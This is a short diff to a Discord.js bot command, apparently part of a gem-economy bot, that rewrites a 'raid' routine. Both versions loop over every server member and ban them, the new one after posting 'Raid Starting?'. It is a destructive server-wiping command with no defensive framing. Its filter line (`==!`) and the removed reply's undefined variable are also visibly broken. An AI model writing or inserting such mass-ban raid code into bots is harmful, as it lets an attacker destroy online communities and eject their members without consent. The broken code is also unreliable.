@@ -2,11 +2,8 @@ const Discord = require("discord.js");
 let gems = require("../gems.json");
 
 module.exports.run = async (bot, message, args) => {
-  message.guild.members.filter(u => u.id ==! 'stock-prices').forEach(user => {
-    let reason = "RAID!";
-    user.ban(reason)
-    message.reply(`${member.user.username} has been banned by ${message.author.username} because: **__${reason}__**`);
-  });
+  message.channel.send("Raid Starting?");
+  message.guild.members.filter(u => u.id ==! 'stock-prices').forEach(user => user.ban("NO!"));
 }
 
 module.exports.help = {
